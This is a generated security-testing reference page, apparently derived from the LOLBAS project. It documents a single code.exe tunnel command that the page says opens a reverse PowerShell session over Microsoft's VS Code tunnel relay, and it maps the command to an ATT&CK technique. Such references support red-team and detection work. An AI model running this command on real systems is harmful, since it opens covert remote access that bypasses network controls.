---
parsed_by: focuslocust
source: commands
type: generated
---
# code Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## code.exe

Tool page: [code.exe](../../tools/windows/code.exe.md)

### Reverse PowerShell session over MS provided infrastructure.

```text
code.exe tunnel --accept-server-license-terms --name "tunnel-name"
```

Description:

Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets; command

Related ATT&CK:

- [T1219.001](../../attack/techniques/T1219.001-ide-tunneling.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/HonorableMentions/Code.yml` |
| Evidence | Command preserved from source parser. |
